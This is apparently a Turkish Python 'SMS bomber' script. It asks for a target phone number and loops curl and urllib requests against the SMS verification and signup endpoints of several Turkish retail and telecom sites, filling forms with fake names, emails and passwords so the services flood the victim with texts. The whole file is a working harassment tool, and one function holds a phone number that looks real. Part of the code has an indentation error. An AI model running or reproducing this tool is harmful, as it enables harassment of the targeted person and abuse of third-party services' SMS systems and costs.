import os
import colors
import urllib.request
import subprocess

kaç_defa = 0

numara = input("numara: ")


#smskutususms
def smskutusu():
  global kaç_defa
  while kaç_defa < 5:
    print("#"*20, "SMS KUTUSU SMS", "#"*20)
    kaç_defa += 1
    print("sms kutusu sms deneme sayısı: ", kaç_defa)
    smskutusu = os.popen("""curl --silent curl -i -X POST \
   -H "Origin:http://www.smskutusu.com" \
   -H "Upgrade-Insecure-Requests:1" \
   -H "DNT:1" \
   -H "Content-Type:application/x-www-form-urlencoded" \
   -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" \
   -H "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" \
   -d "numara=HEDEF TELEFON NUMARASI" \
   -d "submit=GÖNDER" \
 'http://www.smskutusu.com/ex/test.php'| grep HTTP | awk '{print $2}'""").read()
    if int(smskutusu) == 200:
        print("mesaj gönderildi")
    else:
        print("smskutusu mesaj gönderemedi")


#smartcellsms
def smartcellsms():
  global kaç_defa
  while kaç_defa < 5:
    print("#"*20, "SMARTCELL SMS", "#"*20)
    kaç_defa += 1
    print("smartcell sms deneme sayısı: ", kaç_defa)
    smartcell = os.popen("""curl --silent -i -X POST \
   -H "Accept:*/*" \
   -H "Origin:http://smartcell.com.tr" \
   -H "X-Requested-With:XMLHttpRequest" \
   -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" \
   -H "DNT:1" \
   -H "Content-Type:application/x-www-form-urlencoded" \
   -d "txt_gsmno=HEDEF TELEFON NUMARASI" \
 'http://smartcell.com.tr/site/hiztesti'| grep HTTP | awk '{print $2}'""").read()
    if int(smartcell) == 200:
        print("mesaj gönderildi")
    else:
        print("smartcell mesaj gönderemedi")


#hicretsms
def hicretsms():
  global kaç_defa
  while kaç_defa < 5:
    print("#"*20, "HİCRET SMS", "#"*20)
    kaç_defa += 1
    print("hicret sms deneme sayısı: ", kaç_defa)
    hicretsms = os.popen("""curl --silent -i -X POST \
   -H "Accept:*/*" \
   -H "Origin:http://hicretsms.com" \
   -H "X-Requested-With:XMLHttpRequest" \
   -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" \
   -H "DNT:1" \
   -H "Content-Type:application/x-www-form-urlencoded" \
   -d "txt_gsmno=HEDEF TELEFON NUMARASI" \
 'http://hicretsms.com/site/hiztesti'| grep HTTP | awk '{print $2}'""").read()
    if int(hicretsms) == 200:
        print("mesaj gönderildi")
    else:
        print("hicretsms mesaj gönderemedi")

 
#etiksms
def etiksms():
  global kaç_defa
  while kaç_defa < 5:
    print("#"*20, "ETİK SMS", "#"*20)
    kaç_defa += 1
    print("etik sms deneme sayısı: ", kaç_defa)
    etiksms = os.popen("""curl --silent -i -X POST \
   -H "Origin:https://etik.com" \
   -H "Upgrade-Insecure-Requests:1" \
   -H "DNT:1" \
   -H "Content-Type:application/x-www-form-urlencoded" \
   -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" \
   -H "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" \
   -d "tel=HEDEF TELEFON NUMARASI" \
 'https://etik.com/sendSms.php'| grep HTTP | awk '{print $2}'""").read()
    if int(etiksms) == 200:
        print("mesaj gönderildi")
    else:
        print("etiksms mesaj gönderemedi")

#sakasu
def sakasu():
  global kaç_defa
  while kaç_defa < 5:
    print("#"*20, "SAKA SU", "#"*20)
    kaç_defa += 1
    print("saka su deneme sayısı: ", kaç_defa)
    sakasu = os.popen("""curl --silent -i -X POST \
   -H "Accept:application/json, text/javascript, */*; q=0.01" \
   -H "Origin:https://www.sakasu.com.tr" \
   -H "X-Requested-With:XMLHttpRequest" \
   -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" \
   -H "DNT:1" \
   -H "Content-Type:application/x-www-form-urlencoded" \
   -d "phone=HEDEF TELEFON NUMARASI" \
 'https://www.sakasu.com.tr/app/api_register/step1' --insecure | grep HTTP | awk '{print $2}'""").read()
    if int(sakasu) == 200:
        print("mesaj gönderildi")
    else:
        print("sakasu mesaj gönderemedi")

#atasun
def atasun():
  global kaç_defa
  while kaç_defa < 5:
    print("#"*20, "ATASUN", "#"*20)
    kaç_defa += 1
    print("atasun deneme sayısı: ", kaç_defa)
    atasun = os.popen("""curl --silent -i -X POST \
   -H "Accept:*/*" \
   -H "Origin:https://www.atasunoptik.com.tr" \
   -H "X-Requested-With:XMLHttpRequest" \
   -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" \
   -H "DNT:1" \
   -H "Content-Type:application/x-www-form-urlencoded" \
   -d "PermissionData[email]=yoyo@asfa.com" \
   -d "PermissionData[gender]=Kadın" \
   -d "PermissionData[attribute01]=" \
   -d "PermissionData[gsmphone]=0(534) 848 95 84" \
   -d "mid=" \
   -d "userBirthYear=1991" \
   -d "userBirthDay=19" \
   -d "userBirthMonth=10" \
 'https://www.atasunoptik.com.tr/Uye/SendSmsMobilDev'| grep HTTP | awk '{print $2}'""").read()
    if int(atasun) == 200:
        print("mesaj gönderildi")
    else:
        print("atasun mesaj gönderemedi")

#multinet
def multinet():
  global kaç_defa
  while kaç_defa < 1:
    print("#"*20, "MULTİNET", "#"*20)
    kaç_defa += 1
    print("multinet deneme sayısı: ", kaç_defa)
    multinet = os.popen("""curl --silent -i -X POST \
   -H "Accept:*/*" \
   -H "Origin:https://kullanici.multinet.com.tr" \
   -H "X-Requested-With:XMLHttpRequest" \
   -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" \
   -H "DNT:1" \
   -H "Content-Type:application/x-www-form-urlencoded" \
   -d "CheckAggrement=true" \
   -d "CheckAggrement=false" \
   -d "Email=aopasdiasd@aklsd.com" \
   -d "Mobile=HEDEF TELEFON NUMARASI" \
   -d "Name=asdsad" \
   -d "Password=klkaddopp22''" \
   -d "RePassword=klkaddopp22" \
   -d "ReturnUrl=" \
   -d "SurName=asda" \
 'https://kullanici.multinet.com.tr/uyeol'| grep HTTP | awk '{print $2}'""").read()
    if int(multinet) == 200:
        print("mesaj gönderildi")
    else:
        print("multinet mesaj gönderemedi")

#ekomesaj
def ekomesaj():
  global kaç_defa
  while kaç_defa < 1:
    print("#"*20, "EKOMESAJ", "#"*20)
    kaç_defa += 1
    print("ekomesaj deneme sayısı: ", kaç_defa)
    ekomesaj = os.popen("""curl --silent -i -X POST    -H "Content-Type:application/x-www-form-urlencoded"    -d "tel=HEDEF TELEFON NUMARASI"  'https://www.ekomesaj.com.tr/sendSms.php' | grep HTTP | awk '{print $2}'""").read()
    if int(ekomesaj) == 200:
        print("mesaj gönderildi")
    else:
        print("ekomesaj mesaj gönderemedi")

#e-bebek
def ebebek():
  global kaç_defa
    while kaç_defa < 1:
      print("#"*20, "E-BEBEK", "#"*20)
      kaç_defa += 1
      print("e-bebek deneme sayısı: ", kaç_defa)
      ebebek = urllib.request.urlopen("https://www.e-bebek.com/sms/activation?email=sadasdasdsa%40asdsads.com&phoneNumber=" + numara + "&smsAllow=false&country=TR&lang=tr")
      if ebebek.getcode() == 200:
         print("mesaj gönderildi")
      else:
         print("e-bebek mesaj gönderemedi")
  bas()
  

def bas():
  while True:
    soru = input("""nereden sms göndermek istersin? 
    (1) ebebek
    (2) ekomesaj
    (3) hepsi
    : """)

    if soru == "1":
      ebebek()
    elif soru == "2":
      ekomesaj()
    elif soru == "3":
      ebebek()
      ekomesaj()
      
